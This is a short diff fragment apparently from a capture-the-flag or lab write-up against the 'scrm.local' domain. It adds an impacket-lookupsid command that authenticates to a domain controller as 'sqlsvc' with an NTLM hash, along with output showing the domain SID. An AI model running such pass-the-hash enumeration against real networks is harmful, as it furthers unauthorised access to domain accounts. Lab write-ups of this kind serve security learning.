@@ -288,5 +288,16 @@ B999A16500B87D17EC7F2E2A68778F05
 This is the output
 
 ```python
+impacket-lookupsid -hashes ':B999A16500B87D17EC7F2E2A68778F05' 'scrm.local/sqlsvc@dc1.scrm.local' 0 -k
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Brute forcing SIDs at dc1.scrm.local
+[*] StringBinding ncacn_np:dc1.scrm.local[\pipe\lsarpc]
+[-] CCache file is not found. Skipping...
+[*] Domain SID is: S-1-5-21-2743207045-1827831105-2542523200
+```
+Next ill get the domain SID
+
+```python
 
 ```
